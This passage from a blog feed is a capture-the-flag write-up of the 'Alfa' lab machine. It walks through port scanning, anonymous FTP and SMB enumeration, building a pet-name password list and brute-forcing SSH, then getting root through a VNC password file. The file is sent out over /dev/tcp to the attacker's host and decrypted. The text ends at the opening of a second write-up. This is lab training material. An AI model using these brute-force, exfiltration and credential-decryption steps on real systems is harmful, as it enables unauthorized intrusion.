</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Thu Apr 22 02:41:38 2021 -- 1 IP address (1 host up) scanned in 26.16 seconds</span>
</span></span></code></pre></div><p><code>nmap</code> identified anonymous access is allowed on FTP.</p>
<p>Performing a full port scan, discovers the fifth port.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ nmap -p- nmap/10-allports-alfa 192.168.2.109 -v
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-22 02:53 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.2.109
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65530</span> closed ports
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp    open  ftp
</span></span><span class="line"><span class="cl">80/tcp    open  http
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">65111/tcp open  unknown
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:9C:8A:46 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 36.32 seconds
</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">65536</span> <span class="o">(</span>2.884MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">65536</span> <span class="o">(</span>2.621MB<span class="o">)</span>
</span></span></code></pre></div><p>Poking port 65111 with <code>nc</code> reveals it&rsquo;s SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ nc 192.168.2.109 <span class="m">65111</span>
</span></span><span class="line"><span class="cl">SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
<p>Enumeration with on FTP discovers a potential username called <code>thomas</code>, an image file named <code>milo.jpg</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ ftp 192.168.2.109 
</span></span><span class="line"><span class="cl">Connected to 192.168.2.109.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>192.168.2.109:root<span class="o">)</span>: anonymous
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password:
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; dir
</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Dec <span class="m">17</span> 13:02 thomas
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">cd</span> thomas
</span></span><span class="line"><span class="cl"><span class="m">250</span> Directory successfully changed.
</span></span><span class="line"><span class="cl">ftp&gt; dir
</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>          <span class="m">104068</span> Dec <span class="m">17</span> 12:49 milo.jpg
</span></span></code></pre></div><p><code>milo.jpg</code> is a picture of a dog.</p>
<p><div class="img-container"><img src="imgs/image-20210613181756997.png" alt="image-20210613181756997"  /></div>
</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous access is allowed but no read permission there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 192.168.2.109 -u <span class="s1">&#39;ANONYMOUS&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             <span class="o">[</span>*<span class="o">]</span> Windows 6.1 <span class="o">(</span>name:ALFA<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             <span class="o">[</span>+<span class="o">]</span> <span class="se">\A</span>NONYMOUS: 
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             <span class="o">[</span>+<span class="o">]</span> Enumerated shares
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             Share           Permissions     Remark
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             -----           -----------     ------
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             print$                          Printer Drivers
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             IPC$                            IPC Service <span class="o">(</span>Samba 4.9.5-Debian<span class="o">)</span>
</span></span></code></pre></div><h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Visiting port 80 shows a website titled with &ldquo;Alfa IT Solutions&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422143723577.png" alt="image-20210422143723577"  /></div>
</p>
<p>Nothing useful on the page source.</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a <code>robot.txt</code> file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://192.168.2.109/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster/gobuster-L-80 
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://192.168.2.109/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              html,txt,bak
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/04/22 02:46:48 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/js/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/images/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/css/<span class="o">]</span>   
</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3870<span class="o">]</span>                                  
</span></span><span class="line"><span class="cl">/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/fonts/<span class="o">]</span> 
</span></span><span class="line"><span class="cl">/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 459<span class="o">]</span>                                   
</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span> 
</span></span></code></pre></div><h4 id="robotstxt">robots.txt</h4>
<p>Accessing <code>robots.txt</code> discovers some directories. But, these are just dummy.</p>
<p><div class="img-container"><img src="imgs/image-20210422134810181.png" alt="image-20210422134810181"  /></div>
</p>
<p>Poking the <code>robots.txt</code> file with <code>curl</code> discovers a string which looks like a brainfuck language.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ curl -s http://192.168.2.109/robots.txt
</span></span><span class="line"><span class="cl">/home <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/admin <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/login <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/images <span class="c1">#200, directory listing, nothing interesting</span>
</span></span><span class="line"><span class="cl">/cgi-bin <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/intranet <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/wp-admin <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/wp-login <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">++++++++++<span class="o">[</span>&gt;+&gt;+++&gt;+++++++&gt;++++++++++<span class="o">&lt;&lt;&lt;</span>&lt;-<span class="o">]</span>&gt;&gt;+++++++++++++++++.&gt;&gt;---.+++++++++++.------.-----.&lt;&lt;--.&gt;&gt;++++++++++++++++++.++.-----..-.+++.++.
</span></span></code></pre></div><p>Using <a href="https://www.dcode.fr/brainfuck-language">this site</a>, the string gets translated as <code>/alfa-support</code> .</p>
<p><div class="img-container"><img src="imgs/image-20210613181246585.png" alt="image-20210613181246585"  /></div>
</p>
<h4 id="alfa-support">/alfa-support</h4>
<p>On <code>/alfa-support</code>, there is a chat between Thomas as the employee and the IT support operator (I think?).</p>
<p><div class="img-container"><img src="imgs/image-20210422143814423.png" alt="image-20210422143814423"  /></div>
</p>
<p>From the conversation above, I&rsquo;ll note that Thomas uses a password that consists of his(or her?) pet&rsquo;s name followed by 3 numerical digits.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-thomas">Shell as Thomas</h3>
<h4 id="creating-wordlist">Creating Wordlist</h4>
<p>From the previous FTP enumeration, &lsquo;milo&rsquo; is most likely the name of Thomas&rsquo;s pet.  With <code>bash</code>, I could generate all the possible password used by Thomas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in <span class="o">{</span>000..999<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&#34;milo</span><span class="nv">$i</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">done</span> <span class="p">|</span> tee passwords
</span></span><span class="line"><span class="cl">milo000
</span></span><span class="line"><span class="cl">milo001
</span></span><span class="line"><span class="cl">milo002
</span></span><span class="line"><span class="cl">milo003
</span></span><span class="line"><span class="cl">...&lt;snip&gt;...
</span></span></code></pre></div><h4 id="brute-force---ftp">Brute force - FTP</h4>
<p>I tried it with Hydra on FTP but returns nothing.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ hydra -l thomas -P passwords ftp://192.168.2.103 
</span></span><span class="line"><span class="cl">Hydra v9.0 <span class="o">(</span>c<span class="o">)</span> <span class="m">2019</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-04-22 03:43:09
</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Restorefile <span class="o">(</span>you have <span class="m">10</span> seconds to abort... <span class="o">(</span>use option -I to skip waiting<span class="o">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">1000</span> login tries <span class="o">(</span>l:1/p:1000<span class="o">)</span>, ~63 tries per task
</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ftp://192.168.2.103:21/
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 320.00 tries/min, <span class="m">320</span> tries in 00:01h, <span class="m">713</span> to <span class="k">do</span> in 00:03h, <span class="m">16</span> active
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 317.00 tries/min, <span class="m">634</span> tries in 00:02h, <span class="m">399</span> to <span class="k">do</span> in 00:02h, <span class="m">16</span> active
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 315.67 tries/min, <span class="m">947</span> tries in 00:03h, <span class="m">86</span> to <span class="k">do</span> in 00:01h, <span class="m">16</span> active
</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target completed, <span class="m">0</span> valid passwords found
</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Writing restore file because <span class="m">15</span> final worker threads did not <span class="nb">complete</span> <span class="k">until</span> end.
</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">15</span> targets did not resolve or could not be connected
</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">0</span> targets did not <span class="nb">complete</span>
</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-04-22 03:46:35
</span></span></code></pre></div><h4 id="brute-force---ssh">Brute force - SSH</h4>
<p>This time I will use <code>crackmapexec</code> , and I will divide the wordlist into two files</p>
<ul>
<li>passwords1: 000-500</li>
<li>passwords2: 500-999</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 192.168.2.109 -u thomas -p passwords2 --port <span class="m">65111</span>
</span></span></code></pre></div><p>After some minutes it returns one valid combination: <code>thomas:milo666</code></p>
<p><div class="img-container"><img src="imgs/image-20210422151432013.png" alt="image-20210422151432013"  /></div>
</p>
<h4 id="ssh---thomas">SSH - Thomas</h4>
<p>I&rsquo;ll just log in via SSH and grabs the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ ssh -p <span class="m">65111</span> thomas@192.168.2.109
</span></span><span class="line"><span class="cl">thomas@192.168.2.109<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Linux Alfa 4.19.0-13-amd64 <span class="c1">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">####################################################################</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  ,---------------------------,                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  |  /---------------------\  |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |                       | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |         +----+        | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |         |ALFA|        | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |         +----+        | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |                       | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  |  \_____________________/  |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  |___________________________|                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                ,---\_____     []     _______/------,             #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#              /         /______________\           /|             #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            /___________________________________ /  | ___         #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            |                                   |   |    )        #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            |  _ _ _                 [-------]  |   |   (         #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            |  o o o                 [-------]  |  /    _)_       #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            |__________________________________ |/     /  /       #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        /-------------------------------------/|      ( )/        #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#      /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#    /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                     #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗  #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝  #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗    #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝    #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  #</span>
</span></span><span class="line"><span class="cl"><span class="c1">####################################################################</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">thomas@Alfa:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>thomas<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>thomas<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>1000<span class="o">(</span>thomas<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
</span></span><span class="line"><span class="cl">thomas@Alfa:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas <span class="m">1332</span> dic <span class="m">20</span> 11:04 user.txt
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal enumeration</h4>
<p>In thomas&rsquo;s home directory,  there is a file called <code>.remote-secret</code> and it is owned by root but world-writable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thomas@Alfa:~$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">40</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> thomas thomas <span class="m">4096</span> dic <span class="m">20</span> 22:22 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root   root   <span class="m">4096</span> dic <span class="m">16</span> 07:58 ..
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> thomas thomas    <span class="m">4</span> dic <span class="m">20</span> 22:22 .bash_history
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas  <span class="m">220</span> dic <span class="m">16</span> 07:58 .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas <span class="m">3526</span> dic <span class="m">16</span> 07:58 .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">3</span> thomas thomas <span class="m">4096</span> dic <span class="m">16</span> 21:15 .gnupg
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> thomas thomas <span class="m">4096</span> dic <span class="m">16</span> 20:44 .local
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas  <span class="m">807</span> dic <span class="m">16</span> 07:58 .profile
</span></span><span class="line"><span class="cl">-rwxrwxrwx <span class="m">1</span> root   root     <span class="m">16</span> dic <span class="m">17</span> 23:35 .remote_secret
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas <span class="m">1332</span> dic <span class="m">20</span> 11:04 user.txt
</span></span></code></pre></div><p>At first, I assumed it was some kind of service hijacking, but the file contents appeared to be encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thomas@Alfa:~$ cat .remote_secret 
</span></span><span class="line"><span class="cl">�<span class="s2">&#34;�Cc�&#34;</span>�Cc
</span></span></code></pre></div><p>Running <a href="https://github.com/DominicBreuker/pspy">pspy</a> discovers a VNC server running locally with root access on port 5901.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">2021/04/22 10:47:57 CMD: UID=0    PID=404    | /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth    
</span></span></code></pre></div><h4 id="vnc-decrypt">VNC Decrypt</h4>
<p>This <code>.remote_secret</code> is a VNC password file and I could use <a href="https://github.com/jeroennijhof/vncpwd">vncpwd</a> to decrypt it (I&rsquo;ve also done this previously on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-cascade/#decrypt-vnc-password">HTB: Cascade</a>). I&rsquo;ll transfer the file to my attacking machine and decrypt it there.</p>
<p>On Alfa:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thomas@Alfa:~$ cat .remote_secret &gt; /dev/tcp/192.168.2.103/9000
</span></span></code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; remote_secret
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.2.103<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.2.109<span class="o">]</span> <span class="m">57532</span>
</span></span></code></pre></div><p>The file content is decrypted to <code>k!LL3rSs</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ ./vncpwd remote_secret 
</span></span><span class="line"><span class="cl">Password: k!LL3rSs
</span></span></code></pre></div><p>I tried the password on root, but it didn&rsquo;t work. The next option here is to access the VNC server using this password.</p>
<h4 id="accessing-vnc">Accessing VNC</h4>
<p>Since the VNC server is not accessible from outside, I&rsquo;ll need a port forwarding to interact with it.</p>
<p>On thomas&rsquo;s session</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thomas@Alfa:~$ ~C
</span></span><span class="line"><span class="cl">ssh&gt; -L 5901:localhost:5901 
</span></span><span class="line"><span class="cl">Forwarding port.
</span></span></code></pre></div><p>That will create a tunnel from my Kali localhost:5901 =&gt; Alfa&rsquo;s localhost:5901</p>
<p>Now I can try to connect to the VNC server using <code>vncviewer</code> (it&rsquo;s preinstalled on Kali) and supply the <code>remote_secret</code> file to <code>-password</code> option.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103»  
</span></span><span class="line"><span class="cl">$ vncviewer -passwd remote_secret 127.0.0.1:5901
</span></span><span class="line"><span class="cl">Connected to RFB server, using protocol version 3.8
</span></span><span class="line"><span class="cl">Performing standard VNC authentication
</span></span><span class="line"><span class="cl">Authentication successful
</span></span><span class="line"><span class="cl">Desktop name <span class="s2">&#34;Alfa:1 (root)&#34;</span>
</span></span><span class="line"><span class="cl">VNC server default format:
</span></span><span class="line"><span class="cl">  <span class="m">32</span> bits per pixel.
</span></span><span class="line"><span class="cl">  Least significant byte first in each pixel.
</span></span><span class="line"><span class="cl">  True colour: max red <span class="m">255</span> green <span class="m">255</span> blue 255, <span class="nb">shift</span> red <span class="m">16</span> green <span class="m">8</span> blue <span class="m">0</span>
</span></span><span class="line"><span class="cl">Using default colormap which is TrueColor.  Pixel format:
</span></span><span class="line"><span class="cl">  <span class="m">32</span> bits per pixel.
</span></span><span class="line"><span class="cl">  Least significant byte first in each pixel.
</span></span><span class="line"><span class="cl">  True colour: max red <span class="m">255</span> green <span class="m">255</span> blue 255, <span class="nb">shift</span> red <span class="m">16</span> green <span class="m">8</span> blue <span class="m">0</span>
</span></span><span class="line"><span class="cl">Same machine: preferring raw encoding
</span></span></code></pre></div><p>It opens this Windows, and I&rsquo;m already on root.</p>
<p><div class="img-container"><img src="imgs/image-20210422160633799.png" alt="image-20210422160633799"  /></div>
</p>
<p>To be honest, this is actually guessing.</p>
<p>At first I doubt that this remote_secret is shared with root user, but that&rsquo;s how I pwned this machine.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Bucket</title>
      <link>https://fahmifj.github.io/hackthebox/bucket/</link>
      <pubDate>Sat, 24 Apr 2021 22:03:47 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/bucket/</guid>
      <description>Pentesting against simulated AWS S3 Bucket </description>
      <content:encoded><![CDATA[<p>Bucket, as the name implies, features a simulated Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This allows me to drop a web shell into the bucket to gain a foothold on the system. Enumerating on the system discovers several credentials from the DynamoDB and one of them is reused by the user. Inspecting the web configuration files reveals that there is  an internal web currently running as a root user, which then can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Pentesting AWS S3</li>
<li>Port Forwarding</li>
<li>Exploiting PD4ML</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Gobuster - <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
